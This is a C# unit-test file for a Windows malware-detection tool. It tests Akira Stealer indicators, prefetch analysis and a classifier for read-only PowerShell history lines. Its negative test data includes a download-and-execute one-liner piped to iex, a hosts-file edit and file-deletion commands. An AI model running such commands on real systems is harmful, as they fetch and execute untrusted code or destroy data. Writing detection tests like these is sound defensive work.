using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Spor.Modules;
using Xunit;

namespace Spor.Tests
{
    /// <summary>
    /// Spor 0.12.0, from an Akira Stealer case (ember-aspen) that 0.11.0 called StoatWaffle: the encrypted pattern database, the
    /// Akira Stealer patterns, PowerShell history checks that are no malware, prefetch loaded files that mark their loader, injected
    /// Windows accessories (!injection-host) and the paths of prefetch entries that have only a name.
    /// </summary>
    public class AkiraTests
    {
        static string RepoFile(params string[] parts)
        {
            var dir = new DirectoryInfo(AppDomain.CurrentDomain.BaseDirectory);
            while (dir != null && !File.Exists(Path.Combine(dir.FullName, "Spor.csproj"))) dir = dir.Parent;
            Assert.NotNull(dir);
            return Path.Combine(new[] { dir.FullName }.Concat(parts).ToArray());
        }

        // ---- encrypted pattern database ----

        [Fact]
        public void TheEmbeddedDatabaseIsTheSourceFileEncrypted()
        {
            var raw = Util.EmbeddedBytes(Autodetect.EmbeddedFile);
            Assert.NotNull(raw);
            Assert.Equal(File.ReadAllText(RepoFile("resources", "autodetect.txt")), PatternCrypt.Decrypt(raw));
            Assert.Equal("", Util.Embedded("Spor.autodetect.txt"));   // no plain copy in Spor.exe
        }

        [Theory]
        [InlineData("vscode-bootstrap")]
        [InlineData("python399")]
        [InlineData("remotevnc")]
        [InlineData("RenLoader")]
        public void SporExeHasNoPlainPatterns(string text)
        {
            var raw = Util.EmbeddedBytes(Autodetect.EmbeddedFile);
            foreach (var enc in new Encoding[] { Encoding.ASCII, Encoding.Unicode })
                Assert.Equal(-1, IndexOf(raw, enc.GetBytes(text)));
            var exe = File.ReadAllBytes(typeof(Autodetect).Assembly.Location);
            foreach (var enc in new Encoding[] { Encoding.ASCII, Encoding.Unicode })
                if (text != "RenLoader") Assert.Equal(-1, IndexOf(exe, enc.GetBytes(text)));   // RenLoader is also named in Spor's code
        }

        static int IndexOf(byte[] hay, byte[] needle)
        {
            for (int i = 0; i + needle.Length <= hay.Length; i++)
            {
                int j = 0;
                while (j < needle.Length && hay[i + j] == needle[j]) j++;
                if (j == needle.Length) return i;
            }
            return -1;
        }

        [Fact]
        public void EncryptionRoundTripsAndIsDeterministic()
        {
            var text = "# test\npath\t*\\example-folder\\\tTest family\tnote\tC:\\example-folder\\x.exe\t1\n";
            var a = PatternCrypt.Encrypt(Encoding.UTF8.GetBytes(text));
            Assert.Equal(a, PatternCrypt.Encrypt(Encoding.UTF8.GetBytes(text)));
            Assert.Equal(text, PatternCrypt.Decrypt(a));
            Assert.Equal(-1, IndexOf(a, Encoding.ASCII.GetBytes("example-folder")));
        }

        [Theory]
        [InlineData(0)]     // IV
        [InlineData(20)]    // ciphertext
        [InlineData(-1)]    // MAC
        public void ADamagedFileIsRefused(int at)
        {
            var a = PatternCrypt.Encrypt(Encoding.UTF8.GetBytes("path\t*\\x\\\tF\tn\tC:\\x\\y\t1\n"));
            a[at < 0 ? a.Length + at : at] ^= 1;
            Assert.Throws<InvalidDataException>(() => PatternCrypt.Decrypt(a));
            Assert.Throws<InvalidDataException>(() => PatternCrypt.Decrypt(new byte[10]));
        }

        const string TestRow = "path\t*\\override-test-folder\\\tOverride family\tnote\tC:\\override-test-folder\\x.exe\t1";

        static Autodetect.Db LoadFrom(Action<string> setup)
        {
            var dir = Path.Combine(Path.GetTempPath(), "spor-autodetect-" + Guid.NewGuid().ToString("N"));
            Directory.CreateDirectory(dir);
            try { setup(dir); return Autodetect.Load(dir, () => "path\t*\\built-in-folder\\\tBuilt in\tnote\tC:\\built-in-folder\\x\t1"); }
            finally { Directory.Delete(dir, true); }
        }

        [Fact]
        public void BothOverrideFilesWork()
        {
            var plain = LoadFrom(d => File.WriteAllText(Path.Combine(d, Autodetect.OverrideFile), TestRow));
            Assert.Equal("Override family", plain.Patterns.Single().Family);
            Assert.EndsWith(Autodetect.OverrideFile, plain.Source);

            var enc = LoadFrom(d => File.WriteAllBytes(Path.Combine(d, Autodetect.EncryptedOverrideFile), PatternCrypt.Encrypt(Encoding.UTF8.GetBytes(TestRow))));
            Assert.Equal("Override family", enc.Patterns.Single().Family);
            Assert.EndsWith(Autodetect.EncryptedOverrideFile, enc.Source);

            var none = LoadFrom(d => { });
            Assert.Equal("Built in", none.Patterns.Single().Family);
            Assert.Equal("built in", none.Source);
        }

        [Fact]
        public void ABadEncryptedOverrideFallsBackToTheBuiltInPatterns()
        {
            var d = LoadFrom(dir => File.WriteAllBytes(Path.Combine(dir, Autodetect.EncryptedOverrideFile), Encoding.UTF8.GetBytes(TestRow)));
            Assert.Equal("Built in", d.Patterns.Single().Family);
            Assert.Contains(d.Errors, e => e.Contains(Autodetect.EncryptedOverrideFile) && e.Contains("not used"));
        }

        // ---- Akira Stealer patterns ----

        static readonly Autodetect.Db Db = Autodetect.Parse(Autodetect.Embedded());

        static string Family(string kind, string value) => Db.Match(kind, value).Select(p => p.Family).Distinct().SingleOrDefault();

        [Theory]
        [InlineData("path", @"C:\Users\jacka\AppData\Local\Programs\PYTHON\PYTHON399\PYTHON3\PYTHONW.EXE")]   // prefetch: upper case
        [InlineData("path", @"C:\Users\jacka\AppData\Local\Programs\Python\Python399\python3\python.exe")]
        [InlineData("path", @"C:\Users\jacka\AppData\Roaming\remotevnc\ffmpeg\ffmpeg.exe")]
        [InlineData("path", @"C:\Users\jacka\AppData\Roaming\t_id.txt")]
        [InlineData("path", @"C:\Users\jacka\AppData\Roaming\Microsoft\Internet Explorer\wd.pid")]
        [InlineData("path", @"C:\Users\jacka\.vscode\NODEJS\NODE-V22.14.0-WIN-X64\NODE.EXE")]
        [InlineData("path", @"C:\Users\jacka\AppData\Local\Temp\NODE_MODULES\LZMA-NATIVE\PREBUILDS\WIN32-X64\LIBLZMA.DLL")]
        [InlineData("path", @"C:\Users\jacka\AppData\Local\Temp\ak1764032000123.mjs")]
        [InlineData("run", "Microsoft Display Driver Manager")]
        [InlineData("cmd", @"""C:\Windows\System32\charmap.exe"" --wd")]
        [InlineData("cmd", @"C:\Windows\System32\calc.exe tunnel --url http://localhost:49152")]
        [InlineData("cmd", @"C:\Windows\SysWOW64\dllhost.exe --obf-args")]
        public void AkiraStealerTraces(string kind, string value) => Assert.Equal("Akira Stealer", Family(kind, value));

        [Theory]
        [InlineData("path", @"C:\Users\anna\.vscode\extensions\ms-python.python-2026.1.0\x.js")]
        [InlineData("path", @"C:\Users\anna\AppData\Local\Temp\node_modules\left-pad\index.js")]
        [InlineData("path", @"C:\Users\anna\AppData\Local\Programs\Python\Python313\pythonw.exe")]
        [InlineData("cmd", @"C:\Windows\System32\dllhost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}")]
        [InlineData("cmd", @"C:\Windows\System32\calc.exe")]
        public void NotAkiraStealer(string kind, string value) => Assert.Null(Family(kind, value));

        [Fact]
        public void TheVsCodeBootstrapScriptIsNoSingleFamily()
        {
            Assert.Equal("VS Code bootstrap loader", Family("cmd", @"cmd.exe /c C:\Users\anna\.vscode\vscode-bootstrap.cmd"));
            Assert.DoesNotContain(Db.Patterns, p => p.Family == "StoatWaffle" || p.Family == "Fake Python");
        }

        // ---- PowerShell history: checks are no malware ----

        [Theory]
        // ember-aspen: a helper's cleanup script, typed into PowerShell
        [InlineData(@"Test-Path ""$env:LOCALAPPDATA\Programs\Python\Python399"",""$env:APPDATA\remotevnc"",""$env:USERPROFILE\.vscode\vscode-bootstrap.cmd"",""$env:TEMP\node_modules"",""$env:APPDATA\t_id.txt""")]
        [InlineData(@"Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' | Select-Object 'Microsoft Display Driver Manager'`")]
        [InlineData(@"Get-CimInstance Win32_Process | Where-Object { ($_.Name -eq 'dllhost.exe' -and $_.CommandLine -notmatch '/Processid:') -or $_.Name -in 'calc.exe','pythonw.exe' } | Select-Object ProcessId,ParentProcessId,Name,CommandLine,CreationDate`")]
        [InlineData(@"Get-Content ""$env:APPDATA\Microsoft\Internet Explorer\wd.pid"",""$env:APPDATA\Microsoft\Internet Explorer\pidp.log""`")]
        [InlineData("# Startup entry`")]
        [InlineData(@"dir $env:USERPROFILE\.vscode; Test-Path C:\x # comment; Remove-Item x")]
        [InlineData(@"Get-ChildItem C:\Users -Recurse -Filter vscode-bootstrap.cmd | ft FullName")]
        public void ReadOnlyChecks(string line) => Assert.True(ClickFix.ReadOnlyCheck(line), line);

        [Theory]
        [InlineData("irm https://raw.githubusercontent.com/x/y/main/a.ps1 | iex")]
        [InlineData(@"Add-Content C:\Windows\System32\drivers\etc\hosts ""`n0.0.0.0 example.com""")]
        [InlineData(@"cmd /c C:\Users\anna\.vscode\vscode-bootstrap.cmd")]
        [InlineData(@"Test-Path C:\x; Remove-Item C:\x")]
        [InlineData(@"Get-Content C:\x.ps1 | iex")]
        [InlineData(@"Get-Content C:\x.txt | Set-Content C:\y.txt")]
        [InlineData(@"$a = Get-Content C:\x")]
        [InlineData(@"Test-Path (iwr https://example.com/x)")]
        [InlineData(@"Get-ChildItem C:\x | ForEach-Object { Remove-Item $_ }")]
        [InlineData(@"& C:\x\run.ps1")]
        [InlineData(@"Test-Path ""C:\x")]   // quote does not close
        [InlineData(@"Write-Output $payload > ""$env:APPDATA\remotevnc\run.ps1""")]   // a redirection writes
        [InlineData(@"Get-ChildItem $env:APPDATA\remotevnc | Where-Object { $_.Delete() }")]
        [InlineData(@"Get-Content x | Where-Object { [IO.File]::WriteAllText('y', $_) }")]
        [InlineData("")]
        public void NotReadOnly(string line) => Assert.False(ClickFix.ReadOnlyCheck(line), line);

        [Fact]
        public void TheCheckIsNoKnownMalwareButTheDeployIs()
        {
            var check = @"Test-Path ""$env:USERPROFILE\.vscode\vscode-bootstrap.cmd""";
            Assert.True(ClickFix.ReadOnlyCheck(check));
            Assert.NotEmpty(Db.Match("cmd", check));   // what the module does not observe any more
            Assert.False(ClickFix.ReadOnlyCheck(@"cmd.exe /c C:\Users\anna\.vscode\vscode-bootstrap.cmd"));
        }

        [Fact]
        public void IdenticalHistoryLinesAreOne()
        {
            var lines = new List<string> { "a", "Test-Path x", "", "b ", "Test-Path x", " b", "Test-Path x", "" };
            var same = ClickFix.SameLines(lines);
            Assert.Equal(new[] { 0, 1, 3 }, same.Keys.OrderBy(i => i).ToArray());
            Assert.Equal(new[] { 4, 6 }, same[1].ToArray());
            Assert.Equal(new[] { 5 }, same[3].ToArray());
            Assert.Equal(new[] { 1, 4, 6 }, ClickFix.Occurrences(same, lines, 6).ToArray());
            Assert.Equal(new[] { 2 }, ClickFix.Occurrences(same, lines, 2).ToArray());
        }

        [Fact]
        public void TheCheckHintNamesLinesAndFamilies()
        {
            Assert.Equal("History line 19 only checks for traces of known malware (VS Code bootstrap loader): read-only, like a helper's check, so no known-malware finding.",
                ClickFix.CheckHint(new List<(int, string)> { (19, "VS Code bootstrap loader") }));
            Assert.StartsWith("History lines 3, 9 only check for traces of known malware (3: A; 9: B, C)",
                ClickFix.CheckHint(new List<(int, string)> { (3, "A"), (9, "B, C") }));
        }

        // ---- prefetch: loaded files mark their loader ----

        [Fact]
        public void ADropperIsMarkedByTheMalwareItLoaded()
        {
            var at = DateTime.UtcNow.AddHours(-2);
            var launcher = @"C:\Users\jacka\Desktop\LongshotLauncher\LONGSHOTLAUNCHER.EXE";
            var node = @"C:\Users\jacka\.vscode\NODEJS\NODE-V22.14.0-WIN-X64\NODE.EXE";
            var zip = @"C:\Users\jacka\.vscode\NODEJS\NODE-V22.14.0-WIN-X64.ZIP";
            using (var c = new Ctx(new Options()))
            {
                c.Event(at, "PF", launcher);
                foreach (var f in new[] { node, zip }) { c.ObserveQuiet(f, at); c.Relate(f, launcher, "loaded " + Util.Leaf(f)); }
                Autodetect.Run(c);
                var e = c.Events.Single(x => x.Path == launcher);
                Assert.Contains(Autodetect.Flag, e.Flags);
                Assert.Equal("known malware Akira Stealer: loaded NODE.EXE and 1 more", e.Known);
                Assert.DoesNotContain(c.Findings, f => f.Text.Contains(Autodetect.Flag));   // the loaded files: no SUMMARY lines of their own
            }
        }

        [Fact]
        public void AFileOfTheFamilyIsNotMarkedAgainForWhatItLoaded()
        {
            var at = DateTime.UtcNow.AddHours(-2);
            var pyw = @"C:\Users\jacka\AppData\Local\Programs\PYTHON\PYTHON399\PYTHON3\PYTHONW.EXE";
            var lib = @"C:\Users\jacka\AppData\Local\Programs\PYTHON\PYTHON399\PYTHON3\PYTHON313.DLL";
            using (var c = new Ctx(new Options()))
            {
                c.Event(at, "PF", pyw);
                c.ObserveQuiet(lib, at); c.Relate(lib, pyw, "loaded PYTHON313.DLL");
                Autodetect.Run(c);
                Assert.Equal("known malware Akira Stealer: fake Python 3.99 loader (Python 3.99 does not exist)", c.Events.Single().Known);
            }
        }

        [Fact]
        public void APathlessPrefetchEntryCanBeMarked()
        {
            var at = DateTime.UtcNow.AddHours(-2);
            var zip = @"C:\Users\jacka\AppData\Local\Programs\PYTHON\PYTHON399\PYTHON.ZIP";
            using (var c = new Ctx(new Options()))
            {
                c.Event(at, "PF", "CHARMAP.EXE");
                c.ObserveQuiet(zip, at); c.Relate(zip, "CHARMAP.EXE", "loaded PYTHON.ZIP");
                Autodetect.Run(c);
                Assert.Equal("known malware Akira Stealer: loaded PYTHON.ZIP", c.Events.Single().Known);
            }
        }

        [Fact]
        public void AQuietValueAlsoSeenOtherwiseStaysAFinding()
        {
            var at = DateTime.UtcNow.AddHours(-2);
            var tid = @"C:\Users\jacka\AppData\Roaming\t_id.txt";
            using (var c = new Ctx(new Options()))
            {
                c.ObserveQuiet(tid, at);
                c.Observe("path", tid, at);
                Autodetect.Run(c);
                Assert.Single(c.Findings, f => f.Text.Contains("t_id.txt") && f.Text.Contains("Akira Stealer"));
            }
        }

        // ---- injected Windows accessories ----

        [Theory]
        [InlineData(@"C:\WINDOWS\SYSTEM32\CHARMAP.EXE", true)]
        [InlineData(@"C:\Windows\SysWOW64\calc.exe", true)]
        [InlineData("DLLHOST.EXE", true)]
        [InlineData(@"C:\Windows\System32\notepad.exe", false)]
        [InlineData(@"C:\Users\anna\Desktop\calc.exe", false)]
        [InlineData(@"C:\Windows\System32\calculator.exe", false)]
        public void Accessories(string path, bool host) => Assert.Equal(host, Rules.AccessoryHost(path));

        [Theory]
        [InlineData(@"C:\WINDOWS\SYSTEM32\CHARMAP.EXE", @"C:\USERS\JACKA\APPDATA\LOCAL\PROGRAMS\PYTHON\PYTHON399\PYTHON.ZIP", false, true)]
        [InlineData(@"C:\WINDOWS\SYSTEM32\CALC.EXE", @"C:\Users\anna\AppData\Roaming\x\payload.dll", false, true)]
        [InlineData(@"C:\WINDOWS\SYSTEM32\CALC.EXE", @"C:\Users\anna\AppData\Roaming\x\payload.dll", true, false)]      // validly signed
        [InlineData(@"C:\WINDOWS\SYSTEM32\CALC.EXE", @"C:\Windows\System32\payload.dll", false, false)]                 // Windows' own folders
        [InlineData(@"C:\WINDOWS\SYSTEM32\CALC.EXE", @"C:\Users\anna\Desktop\notes.txt", false, false)]                 // no code
        [InlineData(@"C:\WINDOWS\SYSTEM32\DLLHOST.EXE", @"C:\Users\anna\AppData\Local\Vendor\Ext\shellext.dll", false, false)]   // a shell extension
        [InlineData(@"C:\WINDOWS\SYSTEM32\DLLHOST.EXE", @"C:\Users\anna\AppData\Local\Temp\x.dll", false, true)]       // a DLL in Temp
        [InlineData(@"C:\WINDOWS\SYSTEM32\DLLHOST.EXE", @"C:\Users\anna\AppData\Local\Vendor\Ext\x.pyd", false, true)]
        public void InjectedFiles(string program, string loaded, bool signedOk, bool injected) =>
            Assert.Equal(injected, Rules.InjectedFile(program, loaded, signedOk));

        [Theory]
        [InlineData(@"C:\Windows\System32\calc.exe", @"calc.exe tunnel --url http://localhost:49152", true)]
        [InlineData(@"C:\Windows\System32\charmap.exe", @"""C:\Windows\System32\charmap.exe"" --wd", true)]
        [InlineData(@"C:\Windows\System32\dllhost.exe", @"C:\Windows\System32\dllhost.exe --obf-args", true)]
        [InlineData(@"C:\Windows\System32\dllhost.exe", @"C:\Windows\system32\DllHost.exe /Processid:{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}", false)]
        [InlineData(@"C:\Windows\System32\calc.exe", @"""C:\Windows\System32\calc.exe""", false)]
        [InlineData(@"C:\Windows\System32\notepad.exe", @"notepad.exe C:\x.txt", false)]
        public void AccessoryArguments(string path, string cmd, bool flagged) => Assert.Equal(flagged, Rules.InjectionHostArgs(path, cmd));

        [Fact]
        public void TheFlagIsStrongAndInTheLegend()
        {
            Assert.Equal(new[] { Rules.InjectionHostFlag }, Rules.Strong(new List<string> { Rules.InjectionHostFlag }));
            Assert.Contains(Rules.FlagLegend, f => f.StartsWith(Rules.InjectionHostFlag + " = "));
        }

        // ---- prefetch entries with only a name ----

        [Theory]
        [InlineData(@"C:\Windows\Prefetch\CALC.EXE-1A2B3C4D.pf", 0x1A2B3C4Du)]
        [InlineData("charmap.exe-00ff00ff.pf", 0x00FF00FFu)]
        public void PfNameHashes(string file, uint hash) => Assert.Equal(hash, Prefetch.PfNameHash(file));

        [Theory]
        [InlineData("CALC.EXE.pf")]
        [InlineData("CALC.EXE-XYZ.pf")]
        public void NoPfNameHash(string file) => Assert.Null(Prefetch.PfNameHash(file));

        const string Root = @"\Device\HarddiskVolume3";

        static (string, uint) Known(string rel, Func<string, uint> fn) => (Root + rel, fn(Root + rel));

        [Fact]
        public void TheHashFunctionComesFromThisPcsOwnFiles()
        {
            for (int f = 0; f < Prefetch.PathHashes.Length; f++)
            {
                var fn = Prefetch.PathHashes[f];
                var known = new[] { @"\WINDOWS\SYSTEM32\CMD.EXE", @"\WINDOWS\EXPLORER.EXE", @"\PROGRAM FILES\APP\APP.EXE", @"\WINDOWS\SYSTEM32\CONHOST.EXE" }
                    .Select(r => Known(r, fn)).ToList();
                known.Add((Root + @"\WINDOWS\SYSTEM32\SVCHOST.EXE", 12345));   // a host's hash includes its command line: no match
                Assert.Equal(f, Prefetch.Calibrate(known));
            }
            Assert.Equal(-1, Prefetch.Calibrate(new[] { Known(@"\WINDOWS\EXPLORER.EXE", Prefetch.HashVista), Known(@"\WINDOWS\SYSTEM32\CMD.EXE", Prefetch.HashVista) }));
            Assert.Equal(-1, Prefetch.Calibrate(Enumerable.Range(0, 5).Select(i => (Root + @"\X" + i + ".EXE", (uint)i))));
        }

        [Fact]
        public void APathlessEntryGetsTheWindowsFolderItsHashNames()
        {
            var fn = Prefetch.PathHashes[0];
            Assert.Equal(@"C:\WINDOWS\SYSWOW64\CALC.EXE", Prefetch.ResolvePath("CALC.EXE", fn(Root + @"\WINDOWS\SYSWOW64\CALC.EXE"), Root, "C:", fn));
            Assert.Equal(@"C:\WINDOWS\SYSTEM32\CHARMAP.EXE", Prefetch.ResolvePath("charmap.exe", fn(Root + @"\WINDOWS\SYSTEM32\CHARMAP.EXE"), Root, "C:", fn));
            Assert.Null(Prefetch.ResolvePath("CALC.EXE", fn(Root + @"\USERS\X\CALC.EXE"), Root, "C:", fn));   // a copy elsewhere: unknown
            Assert.Null(Prefetch.ResolvePath("CALC.EXE", 1, Root, "C:", null));
        }

        [Fact]
        public void TheHashesDifferPerPath()
        {
            foreach (var fn in Prefetch.PathHashes)
                Assert.NotEqual(fn(Root + @"\WINDOWS\SYSTEM32\CALC.EXE"), fn(Root + @"\WINDOWS\SYSWOW64\CALC.EXE"));
            Assert.Equal(Prefetch.HashVista(@"\device\x"), Prefetch.HashVista(@"\DEVICE\X"));   // upper case
        }
    }
}
